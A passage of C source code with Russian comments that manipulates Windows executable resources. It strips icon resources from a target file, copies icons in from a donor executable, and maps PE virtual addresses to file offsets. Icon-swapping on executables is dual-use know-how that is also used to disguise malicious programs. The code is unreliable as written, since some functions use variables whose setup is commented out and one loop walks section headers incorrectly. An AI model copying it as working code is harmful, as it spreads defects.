			hUpdateRes = BeginUpdateResource(szTarget,FALSE); 
			if (hUpdateRes) 
			{ 
				for(int j=0;j<256;j++)
				{
					UpdateResourceA(hUpdateRes,szType,MAKEINTRESOURCE(j),NULL,NULL,NULL);
				}
				EndUpdateResource(hUpdateRes, FALSE);
				hUpdateRes = BeginUpdateResource(szTarget,FALSE);
				if (hUpdateRes) 
				{
					MessageBoxA(NULL,"Delete GROUP_ICON",0,0); 
					for(i=0;i<256;i++)
					{
						UpdateResourceA(hUpdateRes,RT_GROUP_ICON,MAKEINTRESOURCE(i),NULL,NULL,NULL);
					}
					EndUpdateResource(hUpdateRes, FALSE);
				}
			} 
		}
		FreeLibrary(hExe);
		printf("Could not load resource.\n"); 
		return;
	} 

	// Определяем местонахождение диалогового
	// окна в глобальной памяти. 
	lpResLock = (char*) LockResource(hResLoad); 
	if (lpResLock == NULL) 
	{ 
		FreeLibrary(hExe);
		printf("Could not lock resource.\n"); 
		return;
	} 

	// Открываем файл, в который хотим добавить
	// ресурс диалогового окна. 
	hUpdateRes = BeginUpdateResource(szTarget,FALSE); 
	if (hUpdateRes == NULL) 
	{ 
		FreeLibrary(hExe);
		printf("Could not open file for writing.\n"); 
		return;
	} 
	/*UpdateResourceA(hUpdateRes,szType,MAKEINTRESOURCE(1),NULL,NULL,NULL);
	EndUpdateResource(hUpdateRes, FALSE);*/

	hUpdateRes = BeginUpdateResource(szTarget,FALSE); 
	// Добавляем ресурс диалогового окна в
	// список обновления. 
	result = UpdateResource(hUpdateRes,// дескриптор обновляемого ресурса
		szType,                   // изменение ресурса блока диалога
		MAKEINTRESOURCE(1),                  // имя блока диалога
		MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),// неопределенный язык
		lpResLock,                   // указатель на инф. о ресурсе 
		dwResSize); // размер инф. о ресурсе. 
	if (result == FALSE) 
	{ 
		FreeLibrary(hExe);
		printf("Could not add resource.\n"); 
		return;
	} 
	// Записываем изменения в FOOT.EXE и затем закрываем его. 
	if (!EndUpdateResource(hUpdateRes, FALSE)) 
	{ 
		FreeLibrary(hExe);
		printf("Could not write changes to file.\n"); 
		return;
	} 

	// Очищаем. 
	if (!FreeLibrary(hExe)) 
	{ 
		printf("Could not free executable.\n"); 
		return;
	}
}
//-------------------------------------------------------------------------------------------------
void ResToFile(LPCSTR szTargetIco, LPCSTR szDonor, LPCSTR szType)
{
	int i;
	HRSRC hResLoad;     // дескриптор загружаемого ресурса
	HMODULE hExe;        // дескриптор существующего .EXE файла
	HRSRC hRes,hResIco;         // дескриптор/указатель на информ. о ресурсе в hExe 
	HANDLE hUpdateRes;  // дескриптор корректировки ресурса 
	char *lpResLock;    // указатель на данные ресурса 
	BOOL result; 
	DWORD dwResSize;
	// Загрузка .EXE файла, содержащего блок диалога,
	// который вы хотите скопировать. 
	/*hExe = LoadLibrary(szDonor); 
	if (hExe == NULL) 
	{ 
		printf("Could not load exe.\n");
		return;
	} 

	// Определяем местонахождение ресурса диалогового окна
	// в .EXE файле. 
	for(i=0;i<=256;i++)
	{
		hRes = FindResource(hExe,MAKEINTRESOURCE(i), szType); 
		if(hRes!=NULL)
		{
			dwResSize = SizeofResource(hExe, hRes);
			if(dwResSize>0)
			{
				hResLoad = (HRSRC)LoadResource(hExe, hRes); 
				if (hResLoad == NULL) 
				{
					printf("Found: %d, size: %d\n",i,dwResSize);
					break;
				}
			}
		}
	}
	if(i==256) {FreeLibrary(hExe);return;}
	printf("Size Resource: %d\n",dwResSize);
	// Загружаем в глобальную память. 
	lpResLock = (char*)LockResource(hResLoad);*/
	HICON hIco = ExtractIcon(NULL,szDonor,0);
	HANDLE File = CreateFile(szTargetIco,GENERIC_WRITE,FILE_SHARE_WRITE,0,OPEN_ALWAYS,0,0);
	// Если не удалось создать файл, то выходим
	if(File == INVALID_HANDLE_VALUE)
	{
		// Освобождаем исполняемый файл
		FreeLibrary(hExe);
		return;
	}

	// Переменная для ф-ции записи в файл
	DWORD Written=0;

	// Записываем весь ресурс в файл
	if(WriteFile(File,lpResLock,dwResSize,&Written,0)==NULL)
	{
		// Освобождаем исполняемый файл
		FreeLibrary(hExe);
		// Закрываем хендл файла
		CloseHandle(File);
		return;
	}
	// Закрываем хендл файла
	CloseHandle(File);
	// Очищаем. 
	if (!FreeLibrary(hExe)) 
	{ 
		printf("Could not free executable.\n"); 
		return;
	}
}
//-------------------------------------------------------------------------------------------------
// Ф-ция для извлечения ресурса
bool ExtractRes(LPCSTR szDonor)
{
	// Инициализируем переменные
	HRSRC hRes = 0;
	HGLOBAL hData = 0;
	LPVOID pData;

	// Загружаем исполняемый файл (в данном случае dll)
	//MessageBoxA(NULL,szDonor,0,0);
	HMODULE hModule = LoadLibrary(szDonor);
	// Если не удалось загрузить исполняемый файл, то выходим
	if(hModule == NULL) return false;
	int i;
	DWORD dwSize;
	for(i=0;i<=256;i++)
	{
		// Находим ресурс в исполняемом файле, указав идентификатор и тип ресурса 
		// (в примере это "JPEGs"),
		hRes = FindResource(hModule,MAKEINTRESOURCE(i),RT_ICON);
		// Если ресурс не найден, то выходим
		if(hRes)
		{
			// Получаем размер ресурса для того, чтобы сохранить его в файл
			dwSize = SizeofResource(hModule,hRes);
			// Если не смогли получить размер, то выходим
			if(dwSize)
			{
				// Загружаем ресурс
				hData = LoadResource(hModule, hRes);
				// Если не смогли загрузить, то выходим
				if(hData)
				{
					printf("Founded: %d\n",i);
					break;
				}
			}
		}
	}
	if(i>=256) 
	{
		FreeLibrary(hModule);
		return false;
	}
	// Фиксируем ресурс в памяти и получаем указатель на первый байт ресурса
	pData = LockResource(hData);
	// Если не удалось зафиксировать ресурс, то выходим
	if(pData == NULL)
	{
		// Освобождаем исполняемый файл
		FreeLibrary(hModule);
		return false;
	}

	// Создаём файл, в который будем писать
	HANDLE File = CreateFile("C:\\data.ico",GENERIC_WRITE,FILE_SHARE_WRITE,0,OPEN_ALWAYS,0,0);
	// Если не удалось создать файл, то выходим
	if(File == INVALID_HANDLE_VALUE)
	{
		// Освобождаем исполняемый файл
		FreeLibrary(hModule);
		return false;
	}

	// Переменная для ф-ции записи в файл
	DWORD Written=0;

	// Записываем весь ресурс в файл
	if(WriteFile(File,pData,dwSize,&Written,0)==NULL)
	{
		// Освобождаем исполняемый файл
		FreeLibrary(hModule);
		// Закрываем хендл файла
		CloseHandle(File);
		return false;
	}

	// Закрываем хендл файла
	CloseHandle(File);
	// Освобождаем исполняемый файл
	FreeLibrary(hModule);
	return true;
}


BOOL ReplaceIcon(LPCSTR szTarget,LPCSTR szDonor,WORD Number)
{

	// Переменные для работы с ресурсами 2-х исполняемых файлов
	HGLOBAL hResLoad;
	HMODULE hModule;
	HRSRC hRes;
	HANDLE hUpdateRes; 
	LPVOID lpResLock; 
	BOOL result; 

	// Загружаем исполняемый файл из которого будем копировать ресурс
	hModule = LoadLibrary(szDonor); 
	// Если загрузить не удалось, то выходим
	if(hModule == NULL) return FALSE;
	int i;
	for(i=0;;i++)
	{
		// Ищем ресурс в памяти исполняемого файла
		hRes = FindResource(hModule, MAKEINTRESOURCE(i), RT_ICON); 
		if (hRes == NULL) 
			continue ; 
		else if(i == 255)
			break;
		else
			break;
	}
	printf("FOUND: %d\n",i);
	// Если найти ресурс не удалось, то выходим
	if(hRes == NULL)
	{
		// Освобождаем исполняемый файл
		FreeLibrary(hModule);
		__ERR("FindResource");
		return FALSE;
	}

	// Загружаем ресурс
	hResLoad = LoadResource(hModule, hRes); 
	// Если загрузить ресурс не удалось, то выходим
	if(hResLoad == NULL)
	{
		// Освобождаем исполняемый файл
		FreeLibrary(hModule);
		__ERR("LoadResource");
		return FALSE;
	}

	// Фиксируем ресурс
	lpResLock = LockResource(hResLoad); 
	// Если не удалось зафиксировать ресурс, то выходим
	if(lpResLock==NULL)
	{
		// Освобождаем исполняемый файл
		FreeLibrary(hModule);
		__ERR("LockResource");
		return FALSE;
	}

	// Пытаемся начать обновлять ресурс второго файла
	hUpdateRes = BeginUpdateResource(szTarget, false);
	// Если не удалось начать обновление, то выходим
	if (hUpdateRes == NULL)
	{
		// Освобождаем исполняемый файл
		FreeLibrary(hModule);
		__ERR("BeginUpdateResource");
		return FALSE;
	}

	// Собственно тут и происходит обновление ресурса 
	result = UpdateResource(hUpdateRes,RT_ICON,MAKEINTRESOURCE(Number),
		MAKELANGID(LANG_NEUTRAL,SUBLANG_NEUTRAL),lpResLock,SizeofResource(hModule, hRes)); 
	// Если не удалось обновить ресурс, то выходим
	if (result == FALSE)
	{
		// Освобождаем исполняемый файл
		FreeLibrary(hModule);
		__ERR("UpdateResource");
		return FALSE;
	}

	// Завершаем обновление
	if(EndUpdateResource(hUpdateRes, FALSE) == NULL){
		// Освобождаем исполняемый файл
		FreeLibrary(hModule);
		__ERR("EndUpdateResource");
		return FALSE;
	}

	// Освобождаем загруженый исполняемый файл
	if(FreeLibrary(hModule) == NULL) return FALSE;
	return TRUE;
}

//***********************************************************
ULONG RVAToRaw(char* szFName,ULONG VirtualAddress)
{
	PVOID lpBase;
	IMAGE_DOS_HEADER *pDosHeader;
	IMAGE_NT_HEADERS *pNtHeader;
	IMAGE_SECTION_HEADER *pSectionHeader;
	ULONG NumOfSections,uLoop;
	HANDLE hFile = CreateFile(szFName,    // file to open
		GENERIC_READ,          // open for reading
		FILE_SHARE_READ,       // share for reading
		NULL,                  // default security
		OPEN_EXISTING,         // existing file only
		FILE_ATTRIBUTE_NORMAL, // normal file
		NULL);
	if (hFile == INVALID_HANDLE_VALUE) 
	{ 
		printf("Could not open file (error %d)\n", GetLastError());
		return 0;
	}
	HANDLE hMapping=CreateFileMapping(hFile,NULL,PAGE_READONLY,0,0,0);
	if (hMapping==NULL)
	{
		printf("Could not map file (error %d)\n",GetLastError());
		return 0;
	}

	lpBase = MapViewOfFile(hMapping,FILE_MAP_READ,0,0,0);
	if (lpBase==NULL)
	{
		printf("Could not read file mapping (error %d)\n",GetLastError());
		return 0;
	}

	pDosHeader=(IMAGE_DOS_HEADER*)lpBase;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		printf("Could not DOS_SIGNATURE\n");
		return 0;
	}
	pNtHeader=(IMAGE_NT_HEADERS*)((unsigned char*)lpBase+pDosHeader->e_lfanew);
	NumOfSections=pNtHeader->FileHeader.NumberOfSections;
	pSectionHeader = (IMAGE_SECTION_HEADER*)((ULONG)pNtHeader + sizeof(ULONG) + sizeof(IMAGE_FILE_HEADER) + pNtHeader->FileHeader.SizeOfOptionalHeader);
	VirtualAddress -= (ULONG)lpBase;
	for(uLoop=0;uLoop<NumOfSections;uLoop++)
	{
		pSectionHeader = (IMAGE_SECTION_HEADER*)((ULONG)pSectionHeader + sizeof(IMAGE_SECTION_HEADER) * uLoop);
		if(VirtualAddress>pSectionHeader->VirtualAddress && VirtualAddress<pSectionHeader->VirtualAddress+pSectionHeader->SizeOfRawData)
		{
			ULONG Offset = VirtualAddress-pSectionHeader->VirtualAddress + pSectionHeader->PointerToRawData;
			return Offset;
		}
	}
	return 0;
}
//******************************************************



